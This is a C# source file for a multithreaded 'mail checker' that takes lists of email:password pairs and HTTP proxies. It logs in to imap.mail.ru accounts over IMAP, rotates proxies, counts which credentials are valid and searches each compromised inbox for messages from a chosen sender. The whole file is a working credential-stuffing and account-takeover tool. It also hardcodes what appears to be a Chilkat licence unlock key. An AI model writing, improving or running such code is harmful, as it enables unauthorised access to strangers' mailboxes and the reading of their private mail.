using System;
using System.Collections.Concurrent;
using System.Threading;
using Chilkat;

namespace Mail_Checker
{
    class Checker
    {

        public EventHandler<CheckEventArgs> OneCheckDone;

        char[] separs = { ':', ';' };
        ConcurrentQueue<string> mails, proxys;
        string serv = "imap.mail.ru";
        string query;

        int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
        int threads, timeout;
        bool started = false;

        public Checker(string[] mails, string[] proxys, string query, int threads, int timeout)
        {
            this.mails = new ConcurrentQueue<string>(mails);
            this.proxys = new ConcurrentQueue<string>(proxys);
            this.query = query;
            this.threads = threads;
            this.timeout = timeout;

        }


        public void Start()
        {
            started = true;


            ThreadPool.SetMaxThreads(threads * 2, threads * 20);
            ThreadPool.SetMinThreads(threads, threads * 10);


            for (int i = 0; i < threads; i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(Check));
            }
        }

        public void Stop()
        {
            started = false;
        }




        void Check(object e)
        {

            workingThreads++;



            while (mails.Count > 0 && proxys.Count > 0 && started)
            {

                Imap imap = new Imap();
                imap.ConnectTimeout = timeout;
                imap.ReadTimeout = timeout;
                imap.Ssl = true;
                imap.Port = 993;

                int messNum = 0;


                string proxyLine;
                proxys.TryDequeue(out proxyLine);
                string[] proxyElements = proxyLine.Split(separs);


                string mailLine;
                mails.TryDequeue(out mailLine);
                string[] mailElements = mailLine.Split(separs);




                bool success = true;
                CheckErrors error = CheckErrors.noError;

                imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");

                
                imap.HttpProxyHostname = proxyElements[0];
                try
                {
                    imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);
                }
                catch (FormatException)
                {
                    success = false;
                    error = CheckErrors.proxyError;
                }

                success = imap.Connect(serv);



                if (success == true)
                {
                    success = imap.Login(mailElements[0], mailElements[1]);
                }
                else if (error == CheckErrors.noError) error = CheckErrors.proxyError;

                if (success == true)
                {
                    success = imap.SelectMailbox("Inbox");
                }
                else if (error == CheckErrors.noError) error = CheckErrors.mailError;


                MessageSet messageSet = null;
                if (success == true)
                {
                    messageSet = imap.Search("ALL", true);
                }
                else if (error == CheckErrors.noError) error = CheckErrors.connectError;
                //
                EmailBundle bundle = null;
                if (messageSet != null)
                {
                    bundle = imap.FetchHeaders(messageSet);
                }
                else if (error == CheckErrors.noError) error = CheckErrors.connectError;


                if (bundle != null)
                {
                    for (int i = 0; i < bundle.MessageCount; i++)
                    {
                        if (bundle.GetEmail(i).FromAddress.Contains(query))
                        {
                            messNum++;
                        }
                    }
                }
                else if (error == CheckErrors.noError) error = CheckErrors.connectError;
                //

                if (error == CheckErrors.proxyError)
                {
                    errors++;
                    mails.Enqueue(mailLine);
                }
                else if (error == CheckErrors.noError)
                {
                    valid++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.mailError)
                {
                    novalid++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.connectError)
                {
                    errors++;
                    mails.Enqueue(mailLine);
                    proxys.Enqueue(proxyLine);
                }



                MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messNum);
                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));


                imap.Disconnect();
                imap.Dispose();

            }

            

            workingThreads--;

        }


    }
}
